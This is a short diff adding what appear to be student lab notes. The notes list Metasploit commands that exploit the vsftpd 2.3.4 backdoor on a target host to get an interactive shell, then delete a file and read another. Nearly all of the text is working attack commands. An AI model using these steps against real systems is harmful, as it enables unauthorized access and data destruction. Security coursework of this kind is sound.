@@ -1,0 +1,17 @@
+week8:
+ in Metasploit:
+ifconfig
+
+kali:
+msfconsole
+> search vsftpd
+> use exploit /unix/ftp/vsftpd-234-backdoor
+> set RHOST (ip_address)
+> show payloads
+> set payload/cmd/unix/interact
+> exploit
+> ls
+> cd media
+> rm csme.txt
+> cd ..
+> cat nohup.out
